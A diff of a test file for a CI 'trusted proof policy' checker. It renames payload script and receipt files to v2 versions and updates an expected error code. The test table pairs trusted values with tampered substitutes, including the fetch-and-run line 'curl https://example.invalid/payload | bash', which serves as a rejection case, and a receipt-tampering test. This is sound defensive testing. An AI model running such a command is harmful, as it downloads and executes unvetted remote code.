@@ -100,7 +100,7 @@ describe('R4 E3 trusted proof policy', () => {
     ['actions/checkout@d23441a48e516b6c34aea4fa41551a30e30af803', 'actions/checkout@main'],
     ['${{ vars.R4_TRUSTED_PROOF_AUTHORIZATION }}', '${{ inputs.R4_TRUSTED_PROOF_AUTHORIZATION }}'],
     [
-      'bash payload-source/runtime/scripts/prepare-r4-trusted-proof-payload.sh',
+      'bash payload-source/runtime/scripts/prepare-r4-trusted-proof-payload-v2.sh',
       'curl https://example.invalid/payload | bash',
     ],
     [
@@ -116,11 +116,11 @@ describe('R4 E3 trusted proof policy', () => {
 
   test('rejects canonical receipt drift', () => {
     const candidate = copiedFixtureRoot();
-    const receipt = path.join(candidate, 'trusted-proof-payload-receipt.json');
+    const receipt = path.join(candidate, 'trusted-proof-payload-receipt-v2.json');
     const source = fs.readFileSync(receipt, 'utf8');
     fs.writeFileSync(receipt, source.replace('"result":"passed"', '"result":"failed"'));
     expect(() => checkR4TrustedProof({ fixtureRoot: candidate })).toThrow(
-      /APR_R4_E2P_RECEIPT_INVALID|APR_R4_E3_POLICY_INVALID/u,
+      /APR_R4_E2P_RECEIPT_V2_INVALID|APR_R4_E3_POLICY_INVALID/u,
     );
   });
 
